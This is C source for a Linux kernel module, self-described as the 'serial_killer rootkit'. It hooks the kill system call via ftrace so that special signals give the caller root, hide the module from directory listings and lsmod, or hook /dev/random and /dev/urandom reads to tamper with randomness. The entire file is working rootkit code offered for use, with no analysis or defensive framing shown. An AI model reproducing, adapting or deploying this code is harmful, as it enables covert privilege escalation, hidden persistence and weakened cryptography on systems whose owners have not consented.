#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "../utils/ftrace_helper.h"
#include "../utils/version_handler.h"
#include "../utils/credential_handler.h"
#include "../utils/presence_handler.h"
#include "../utils/rng_handler.h"

MODULE_AUTHOR("mathscantor");
MODULE_DESCRIPTION("serial_killer rootkit");
MODULE_LICENSE("GPL");

// #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
// #define PTREGS_SYSCALL_STUBS 1
// #endif

/* Global Variables */
short has_taken_root = 0;
short is_hidden = 0;
short is_random_active = 1;
static struct ftrace_hook hooks[];
/*-----------------*/

/* Function Prototypes */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage int hook_kill(const struct pt_regs *regs);

#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage int hook_kill(pid_t pid, int sig);
#endif
/*----------------------*/

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("random_read", hook_random_read, &orig_random_read),
    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents)
};

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int hook_kill(const struct pt_regs *regs) {
    
    int sig = regs->si;
    int pid = regs->di;
    int err;

    if (has_taken_root == 0) {
        original_user = prepare_creds();
    }

    switch (sig) {

         // Credentials Handler
        case 60: 
            if (pid == 1) {
                printk(KERN_INFO "serial_killer: Giving Root...\n");
                set_root();
                has_taken_root = 1;
                return 0;
            } else if (pid == 0) {
                printk(KERN_INFO "serial_killer: Resetting UID...\n");
                unset_root();
                return 0;
            } else {
                return orig_kill(regs);
            }

        // Presence Handler
        case 61:
            if (pid == 0 && is_hidden == 0) {
                printk(KERN_ERR "serial_killer: Already Exposed!\n");
            } else if (pid == 0 && is_hidden == 1) {
                printk(KERN_INFO "serial_killer: Exposing myself...\n");
                fh_remove_hook(&hooks[3]);
                fh_remove_hook(&hooks[4]);
                show_lsmod();
                is_hidden = 0;
            } else if (pid == 1 && is_hidden == 0) {
                printk(KERN_INFO "serial_killer: Hiding myself...\n");
                err = fh_install_hook(&hooks[3]);
                if (err) {
                    printk(KERN_DEBUG "install hook_getdents64 err value: %d\n", err);
                    return err;
                }
                err = fh_install_hook(&hooks[4]);
                if (err) {
                    printk(KERN_DEBUG "install hook_getdents err value: %d\n", err);
                    fh_remove_hook(&hooks[3]);
                    return err;
                }
                hide_lsmod(); 
                is_hidden = 1;
            } else if (pid == 1 && is_hidden == 1) {
                printk(KERN_ERR "serial_killer: Already Hidden!\n");
            } else {
                return orig_kill(regs);
            }
            return 0;
        
        // RNG HANDLER
        case 62:
            if (pid == 0 && is_random_active == 0) {
                printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
            } else if (pid == 0 && is_random_active == 1) {
                printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
                err = fh_install_hook(&hooks[1]);
                if (err) {
                    printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
                    return err;
                }
                err = fh_install_hook(&hooks[2]);
                if (err) {
                    printk(KERN_DEBUG "install hook_urandom_read err value: %d\n", err);
                    fh_remove_hook(&hooks[1]);
                    return err;
                }
                is_random_active = 0;
            } else if (pid == 1 && is_random_active == 0) {
                printk(KERN_INFO "serial_killer: RNG - Activating...\n");
                fh_remove_hook(&hooks[1]);
                fh_remove_hook(&hooks[2]);
                is_random_active = 1;
            } else if (pid == 1 && is_random_active == 1) {
                printk(KERN_ERR "serial_killer: RNG - Already Active!");
            } else {
                return orig_kill(regs);
            }
            return 0;
        default:
            return orig_kill(regs);
    }
}

#else
static asmlinkage int hook_kill(pid_t pid, int sig) {
    void set_root(void);

    if (has_taken_root == 0) {
        original_user = prepare_creds();
    }

    switch (sig) {

         // Credentials Handler
        case 60: 
            if (pid == 1) {
                printk(KERN_INFO "serial_killer: Giving Root...\n");
                set_root();
                has_taken_root = 1;
                return 0;
            } else if (pid == 0) {
                printk(KERN_INFO "serial_killer: Resetting UID...\n");
                unset_root();
                return 0;
            } else {
                return orig_kill(pid, sig);
            }

        // Presence Handler
        case 61:
            if (pid == 0 && is_hidden == 0) {
                printk(KERN_ERR "serial_killer: Already Exposed!\n");
            } else if (pid == 0 && is_hidden == 1) {
                printk(KERN_INFO "serial_killer: Exposing myself...\n");
                fh_remove_hook(&hooks[3]);
                fh_remove_hook(&hooks[4]);
                show_lsmod();
                is_hidden = 0;
            } else if (pid == 1 && is_hidden == 0) {
                printk(KERN_INFO "serial_killer: Hiding myself...\n");
                err = fh_install_hook(&hooks[3]);
                if (err) {
                    printk(KERN_DEBUG "install hook_getdents64 err value: %d\n", err);
                    return err;
                }
                err = fh_install_hook(&hooks[4]);
                if (err) {
                    printk(KERN_DEBUG "install hook_getdents err value: %d\n", err);
                    fh_remove_hook(&hooks[3]);
                    return err;
                }
                hide_lsmod(); 
                is_hidden = 1;
            } else if (pid == 1 && is_hidden == 1) {
                printk(KERN_ERR "serial_killer: Already Hidden!\n");
            } else {
                return orig_kill(pid, sig);
            }
            return 0;
        
        // RNG HANDLER
        case 62:
            if (pid == 0 && is_random_active == 0) {
                printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
            } else if (pid == 0 && is_random_active == 1) {
                printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
                err = fh_install_hook(&hooks[1]);
                if (err) {
                    printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
                    return err;
                }
                err = fh_install_hook(&hooks[2]);
                if (err) {
                    printk(KERN_DEBUG "install hook_urandom_read err value: %d\n", err);
                    fh_remove_hook(&hooks[1]);
                    return err;
                }
                is_random_active = 0;
            } else if (pid == 1 && is_random_active == 0) {
                printk(KERN_INFO "serial_killer: RNG - Activating...\n");
                fh_remove_hook(&hooks[1]);
                fh_remove_hook(&hooks[2]);
                is_random_active = 1;
            } else if (pid == 1 && is_random_active == 1) {
                printk(KERN_ERR "serial_killer: RNG - Already Active!");
            } else {
                return orig_kill(pid, sig);
            }
            return 0;
        default:
            return orig_kill(pid, sig);
    }
}
#endif

int __init serial_killer_init(void){

    int err;
    //err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    // install hook for sys_kill 
    err = fh_install_hook(&hooks[0]);
    if (err) {
        printk(KERN_DEBUG "err value: %d\n", err);
        return err;
    }
    printk(KERN_DEBUG "serial_killer: Loaded!\n");
    return 0;
}

void __exit serial_killer_exit(void){
    //fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    fh_remove_hook(&hooks[0]);
    if (is_random_active == 0) {
        fh_remove_hook(&hooks[1]);
        fh_remove_hook(&hooks[2]);
    } 
    if (is_hidden) {
        fh_remove_hook(&hooks[3]);
        fh_remove_hook(&hooks[4]);
    }
    printk(KERN_DEBUG "serial_killer: Unloaded!\n");
}

module_init(serial_killer_init);
module_exit(serial_killer_exit);

